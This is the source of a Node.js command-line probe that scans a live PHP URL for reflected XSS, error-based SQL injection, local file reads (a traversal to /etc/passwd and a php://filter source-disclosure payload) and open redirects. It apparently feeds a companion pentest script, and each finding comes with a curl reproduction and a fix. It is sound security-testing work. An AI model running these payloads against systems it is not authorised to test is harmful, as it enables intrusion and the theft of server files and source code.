#!/usr/bin/env node
// probe.cjs — deterministic, zero-token recon for a LIVE php url.
// Turns a URL into the same JSON shape scanner.php emits, so pentest.cjs can consume it.
//
// Usage: node probe.cjs <url> [--json] [--out=findings.json]
//
// What it does (all harmless, one request per hypothesis, GET/POST only):
//   reflection  -> XSS candidates (raw vs escaped)
//   quote marks -> SQL error strings (error-based SQLi)
//   traversal   -> /etc/passwd read (LFI) and php://filter source disclosure
//   redirect    -> attacker-controlled Location header
// Every finding is a *candidate*: pentest.cjs still has to prove it with its own curl.
const { execFile } = require('child_process');
const fs = require('fs');

const UA = 'php-scanner-probe/1.0 (+https://github.com/hangryclaude/php-scanner)';
const argv = process.argv.slice(2);
const url = argv.find((a) => /^https?:\/\//.test(a));
const outFile = (argv.find((a) => a.startsWith('--out=')) || '').split('=')[1];
const asJson = argv.includes('--json');
const MAX_PARAMS = 12;
const DELAY_MS = 350;

if (!url) { console.error('Usage: node probe.cjs <url> [--json] [--out=file]'); process.exit(2); }

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function http(u, { method = 'GET', data = null, follow = true } = {}) {
  const id = `${process.pid}-${(http._n = (http._n || 0) + 1)}`;
  const bodyFile = `${require('os').tmpdir()}/pscn-${id}.body`;
  const headFile = `${require('os').tmpdir()}/pscn-${id}.head`;
  return new Promise((res) => {
    const args = ['-sS', '-m', '15', '-A', UA, '-D', headFile, '-o', bodyFile,
      '-w', '%{http_code} %{url_effective} %{size_download}'];
    if (follow) args.push('-L', '--max-redirs', '3');
    if (method === 'POST') { args.push('-X', 'POST', '--data', data || ''); }
    args.push(u);
    execFile('curl', args, { maxBuffer: 4e6, timeout: 25000 }, (e, stdout) => {
      // Body goes to a file: a self-including page can stream megabytes, and a
      // stdout capture hit maxBuffer (which surfaced as a false "unreachable").
      let headers = '';
      let body = '';
      try { headers = fs.readFileSync(headFile, 'utf8'); } catch {}
      try {
        const buf = fs.readFileSync(bodyFile);
        body = buf.slice(0, 1500000).toString('utf8'); // first 1.5MB is plenty for reflection
      } catch {}
      try { fs.unlinkSync(bodyFile); } catch {}
      try { fs.unlinkSync(headFile); } catch {}
      const [status, finalUrl] = (stdout || '').trim().split(' ');
      res({ ok: !e, status: parseInt(status, 10) || 0, finalUrl: finalUrl || u, headers, body });
    });
  });
}

function parseParams(u, body) {
  const params = [];
  const seen = new Set();
  const add = (name, method, source) => {
    if (!name || seen.has(method + name)) return;
    seen.add(method + name);
    params.push({ name, method, source });
  };
  try {
    const p = new URL(u);
    for (const [k] of p.searchParams) add(k, 'GET', 'url');
  } catch {}
  // forms: only same-document, action-relative ones are worth poking at a distance
  const formRe = /<form\b([^>]*)>([\s\S]{0,4000}?)<\/form>/gi;
  let m;
  while ((m = formRe.exec(body || ''))) {
    const attrs = m[1] || '';
    const method = /method\s*=\s*["']?post/i.test(attrs) ? 'POST' : 'GET';
    const inputRe = /<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["']?([^"'\s>]+)/gi;
    let i;
    while ((i = inputRe.exec(m[2] || ''))) add(i[1], method, 'form');
  }
  return params.slice(0, MAX_PARAMS);
}

const SQL_ERRORS = [
  /you have an error in your sql syntax/i, /warning: mysqli?_/i, /unclosed quotation mark/i,
  /pg_query\(\)|postgresql.*error/i, /sqlite_?error|unrecognized token/i,
  /ORA-\d{4,5}/, /SQLSTATE\[/, /syntax error at or near/i, /quoted string not properly terminated/i,
];
const looksEscaped = (body, marker) =>
  body.includes('&lt;') && new RegExp(`&lt;\\s*script[^>]*&gt;\\s*${marker}`).test(body);

(async () => {
  const findings = [];
  const notes = [];
  // Probe the URL as given: following a redirect first would throw away the
  // parameters (and an open redirect fires on the very first request).
  const REQ = url;
  const base = await http(REQ);
  const baseBody = base.body || '';
  const baseLen = baseBody.length;
  const params = parseParams(REQ, baseBody);
  notes.push(`status=${base.status} bytes=${baseLen} params=${params.length}`);

  if (base.status === 0) {
    console.log(JSON.stringify({ url, findings, notes: [...notes, 'unreachable'] }, null, 2));
    process.exit(0);
  }

  for (const p of params) {
    const marker = 'pscn' + Math.random().toString(36).slice(2, 8);
    const target = new URL(REQ);
    // ---- reflection / XSS ------------------------------------------------
    const xssPayload = `<script>${marker}</script>`;
    let r;
    if (p.method === 'POST') {
      const data = new URLSearchParams({ [p.name]: xssPayload }).toString();
      r = await http(target.toString(), { method: 'POST', data });
    } else {
      target.searchParams.set(p.name, xssPayload);
      r = await http(target.toString());
    }
    await sleep(DELAY_MS);
    const reflected = (r.body || '').includes(xssPayload);
    const escaped = looksEscaped(r.body || '', marker);
    const shadowed = !reflected && !escaped && (r.body || '').includes(marker);

    if (reflected) {
      findings.push({
        rule: 'XSS.LIVE', severity: 'high', line: 0, file: `${target.origin}${target.pathname}`,
        message: `Reflected XSS candidate: ${p.method} parameter "${p.name}" (${p.source}) is echoed unescaped`,
        snippet: `curl -s '${target.origin}${target.pathname}?${p.name}=<script>${marker}</script>'  ->  raw payload in body`,
        fix: 'Escape on output (htmlspecialchars($x, ENT_QUOTES, "UTF-8")) or use a templating engine with autoescape.',
      });
    } else if (shadowed) {
      findings.push({
        rule: 'XSS.LIVE', severity: 'medium', line: 0, file: `${target.origin}${target.pathname}`,
        message: `Input reflection: ${p.method} parameter "${p.name}" echoes its value back in the page (context needs checking — tags may be filtered)`,
        snippet: `marker "${marker}" appears in the response but the <script> wrapper did not`,
        fix: 'Confirm the reflection context; escape with htmlspecialchars() if it lands in HTML.',
      });
    } else if (escaped) {
      notes.push(`${p.name}: escaped reflection (looks safe)`);
    }

    // ---- error-based SQLi ------------------------------------------------
    const quote = p.name + "'\"";
    let inj;
    if (p.method === 'POST') {
      inj = await http(target.toString(), { method: 'POST', data: new URLSearchParams({ [p.name]: quote }).toString() });
    } else {
      const t2 = new URL(REQ);
      t2.searchParams.set(p.name, quote);
      inj = await http(t2.toString());
    }
    await sleep(DELAY_MS);
    const sqlHit = SQL_ERRORS.find((re) => re.test(inj.body || ''));
    if (sqlHit && !sqlHit.test(baseBody)) {
      findings.push({
        rule: 'SQLI.LIVE', severity: 'high', line: 0, file: `${target.origin}${target.pathname}`,
        message: `SQL injection candidate: quote in ${p.method} parameter "${p.name}" produces a database error`,
        snippet: `curl -s '${target.origin}${target.pathname}?${p.name}=%27%22'  ->  ${(inj.body.match(sqlHit) || [''])[0].slice(0, 80)}`,
        fix: 'Use prepared statements (PDO with bound params); never interpolate input into SQL.',
      });
    }

    // ---- LFI / source disclosure ----------------------------------------
    if (/file|page|path|include|view|tpl|template|lang|doc|dir|load|read|src/i.test(p.name)) {
      const lfiMarkers = [
        { payload: '../../../../../../etc/passwd', rule: 'FILE.LIVE', evidence: /root:.*:0:0:/ },
        { payload: 'php://filter/convert.base64-encode/resource=index.php', rule: 'FILE.LIVE', evidence: /^[A-Za-z0-9+/=]{80,}/m },
      ];
      for (const { payload, rule, evidence } of lfiMarkers) {
        const t3 = new URL(REQ);
        t3.searchParams.set(p.name, payload);
        const lr = await http(t3.toString());
        await sleep(DELAY_MS);
        if (evidence.test(lr.body || '')) {
          findings.push({
            rule, severity: 'high', line: 0, file: `${target.origin}${target.pathname}`,
            message: `Local file read candidate: parameter "${p.name}" takes an include/file path`,
            snippet: `curl -s '${target.origin}${target.pathname}?${p.name}=${payload}'  ->  ${payload.includes('php://') ? 'base64 PHP source' : '/etc/passwd contents'}`,
            fix: 'Whitelist allowed files (basename() alone is not enough); reject php:// and ..',
          });
          break;
        }
      }
    }

    // ---- open redirect ---------------------------------------------------
    if (/url|uri|redir|redirect|return|returnto|next|goto|dest|destination|continue|back|target|forward/i.test(p.name)) {
      const t4 = new URL(REQ);
      t4.searchParams.set(p.name, 'https://example.org/pscn-redirect');
      const rr = await http(t4.toString(), { follow: false });
      await sleep(DELAY_MS);
      const loc = (rr.headers.match(/^location:\s*(.+)$/im) || [])[1] || '';
      if (/example\.org/i.test(loc)) {
        findings.push({
          rule: 'REDIR.LIVE', severity: 'medium', line: 0, file: `${target.origin}${target.pathname}`,
          message: `Open redirect candidate: parameter "${p.name}" drives the Location header`,
          snippet: `curl -si '${target.origin}${target.pathname}?${p.name}=https://example.org/pscn-redirect'  ->  Location: ${loc.trim()}`,
          fix: 'Validate the target against an allowlist of hosts/paths before header("Location: ...").',
        });
      }
    }
  }

  const out = { url: REQ, finalUrl: base.finalUrl, probedAt: new Date().toISOString(), notes, findings };
  if (outFile) fs.writeFileSync(outFile, JSON.stringify(out, null, 2));
  if (asJson || outFile) console.log(JSON.stringify(out, null, 2));
  else {
    console.log(`${out.url}\n  ${notes.join('\n  ')}`);
    for (const f of findings) console.log(`  ${f.severity.toUpperCase().padEnd(6)} ${f.rule} — ${f.message}`);
    if (!findings.length) console.log('  (no live candidates)');
  }
})();
